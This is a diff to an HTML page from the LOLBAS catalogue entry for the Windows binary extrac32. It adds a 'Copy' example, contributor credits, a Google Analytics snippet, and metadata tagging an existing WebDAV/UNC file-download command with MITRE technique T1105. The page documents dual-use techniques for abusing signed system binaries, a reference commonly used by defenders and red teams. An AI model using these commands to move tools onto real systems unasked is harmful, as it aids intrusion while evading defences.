@@ -37,6 +37,9 @@
 	
 	<li><a href="/lolbas/Binaries/Extrac32/#download">Download</a></li>
 	
+	
+	<li><a href="/lolbas/Binaries/Extrac32/#copy">Copy</a></li>
+	
 </ul>
 
 	
@@ -44,6 +47,14 @@
 
 
 
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133649096-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-133649096-1');
+</script>
 
 <br>
 <p><b>Paths:</b> 
@@ -76,6 +87,12 @@
 	<br>
 	
 	Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a>
+	<br>
+	
+	Hai Vaknin(Lux - <a href="https://twitter.com/@VakninHai">@VakninHai</a>
+	<br>
+	
+	Tamir Yehuda - <a href="https://twitter.com/@tim8288">@tim8288</a>
 	<br>
 	 
 </p>
@@ -133,6 +150,25 @@
 		<br>
 		<pre><code>extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt</code></pre>
 		Usecase:Download file from UNC/WEBDav
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+
+	
+<h2 id="copy" class ="function-name">Copy</h2>
+	
+		Command for copying calc.exe to another folder
+		<br>
+		<pre><code>extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe</code></pre>
+		Usecase:Copy file
 		<br>
 		Privileges required:User
 		<br>
